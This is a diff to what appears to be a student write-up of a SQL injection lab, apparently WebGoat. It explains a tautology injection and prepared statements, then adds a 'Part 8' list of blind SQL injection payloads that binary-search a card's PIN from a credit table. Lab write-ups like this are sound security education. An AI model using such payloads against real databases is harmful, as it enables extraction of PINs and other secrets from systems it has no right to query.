@@ -14,3 +14,11 @@ and that is OR'd with the original comparison of last_name = 'name'.
 Consequently, it will always print all of the data since the select statement is SELECT *.
 The vulnerability we exploited was the server not using a prepared statement and instead performing the query 
 directly with the user input. This vulnerability wouldn't have been an issue if they would have used a prepared statement.
+
+Part 8 Explanation:
+101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4000)
+101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4500)
+101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4900)
+101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4870)
+101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4863)
+101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) = 4862)
